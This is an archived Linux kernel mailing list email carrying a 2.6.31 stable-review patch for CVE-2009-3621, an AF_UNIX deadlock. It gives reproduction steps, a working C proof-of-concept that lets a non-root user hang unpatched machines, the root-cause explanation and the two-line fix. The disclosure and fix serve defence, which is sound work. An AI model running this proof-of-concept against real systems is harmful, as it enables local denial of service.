Return-Path: <linux-kernel-owner+w=401wt.eu-S1760359AbZKFW20@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1760359AbZKFW20 (ORCPT <rfc822;w@1wt.eu>);
	Fri, 6 Nov 2009 17:28:26 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S932648AbZKFWXc
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Fri, 6 Nov 2009 17:23:32 -0500
Received: from kroah.org ([198.145.64.141]:57075 "EHLO coco.kroah.org"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S932616AbZKFWX1 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Fri, 6 Nov 2009 17:23:27 -0500
X-Mailbox-Line: From gregkh@mini.kroah.org Fri Nov  6 14:15:49 2009
Message-Id: <20091106221549.160832156@mini.kroah.org>
User-Agent: quilt/0.48-1
Date: Fri, 06 Nov 2009 14:15:13 -0800
From: Greg KH <gregkh@suse.de>
To: linux-kernel@vger.kernel.org, stable@kernel.org
Cc: stable-review@kernel.org, torvalds@linux-foundation.org,
       akpm@linux-foundation.org, alan@lxorguk.ukuu.org.uk,
       Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>,
       Masanori Yoshida <masanori.yoshida.tv@hitachi.com>,
       Chuck Ebbert <cebbert@redhat.com>,
       "David S. Miller" <davem@davemloft.net>
Subject: [75/99] AF_UNIX: Fix deadlock on connecting to shutdown socket (CVE-2009-3621)
References: <20091106221358.309857998@mini.kroah.org>
Content-Disposition: inline; filename=af_unix-fix-deadlock-on-connecting-to-shutdown-socket-cve-2009-3621.patch
In-Reply-To: <20091106221850.GA15408@kroah.com>
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

2.6.31-stable review patch.  If anyone has any objections, please let us know.

------------------
From: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>

commit 77238f2b942b38ab4e7f3aced44084493e4a8675 upstream.

I found a deadlock bug in UNIX domain socket, which makes able to DoS
attack against the local machine by non-root users.

How to reproduce:
1. Make a listening AF_UNIX/SOCK_STREAM socket with an abstruct
    namespace(*), and shutdown(2) it.
 2. Repeat connect(2)ing to the listening socket from the other sockets
    until the connection backlog is full-filled.
 3. connect(2) takes the CPU forever. If every core is taken, the
    system hangs.

PoC code: (Run as many times as cores on SMP machines.)

int main(void)
{
	int ret;
	int csd;
	int lsd;
	struct sockaddr_un sun;

	/* make an abstruct name address (*) */
	memset(&sun, 0, sizeof(sun));
	sun.sun_family = PF_UNIX;
	sprintf(&sun.sun_path[1], "%d", getpid());

	/* create the listening socket and shutdown */
	lsd = socket(AF_UNIX, SOCK_STREAM, 0);
	bind(lsd, (struct sockaddr *)&sun, sizeof(sun));
	listen(lsd, 1);
	shutdown(lsd, SHUT_RDWR);

	/* connect loop */
	alarm(15); /* forcely exit the loop after 15 sec */
	for (;;) {
		csd = socket(AF_UNIX, SOCK_STREAM, 0);
		ret = connect(csd, (struct sockaddr *)&sun, sizeof(sun));
		if (-1 == ret) {
			perror("connect()");
			break;
		}
		puts("Connection OK");
	}
	return 0;
}

(*) Make sun_path[0] = 0 to use the abstruct namespace.
    If a file-based socket is used, the system doesn't deadlock because
    of context switches in the file system layer.

Why this happens:
 Error checks between unix_socket_connect() and unix_wait_for_peer() are
 inconsistent. The former calls the latter to wait until the backlog is
 processed. Despite the latter returns without doing anything when the
 socket is shutdown, the former doesn't check the shutdown state and
 just retries calling the latter forever.

Patch:
 The patch below adds shutdown check into unix_socket_connect(), so
 connect(2) to the shutdown socket will return -ECONREFUSED.

Signed-off-by: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
Signed-off-by: Masanori Yoshida <masanori.yoshida.tv@hitachi.com>
Cc: Chuck Ebbert <cebbert@redhat.com>
Signed-off-by: David S. Miller <davem@davemloft.net>

---
 net/unix/af_unix.c |    2 ++
 1 file changed, 2 insertions(+)

--- a/net/unix/af_unix.c
+++ b/net/unix/af_unix.c
@@ -1074,6 +1074,8 @@ restart:
 	err = -ECONNREFUSED;
 	if (other->sk_state != TCP_LISTEN)
 		goto out_unlock;
+	if (other->sk_shutdown & RCV_SHUTDOWN)
+		goto out_unlock;
 
 	if (unix_recvq_full(other)) {
 		err = -EAGAIN;


